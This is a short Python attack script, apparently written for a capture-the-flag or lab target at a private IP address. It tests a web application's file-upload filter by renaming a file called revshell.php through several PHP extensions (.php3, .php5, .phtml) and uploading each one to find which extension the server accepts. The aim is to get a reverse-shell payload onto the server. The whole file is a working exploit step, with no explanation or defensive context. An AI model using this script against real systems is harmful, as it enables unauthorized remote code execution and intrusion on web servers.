#!/usr/bin/env python

import requests
import os

ip = "10.10.28.187"
url = f"http://{ip}:3333/internal/index.php"

old_filename = "revshell.php"

filename = "revshell"
extension = [
	".php",
	".php3",
	".php5",
	".phtml",
]

for ext in extension:

	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, "rb")}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} SEEMS TO BE ALLOWED??")

	old_filename = new_filename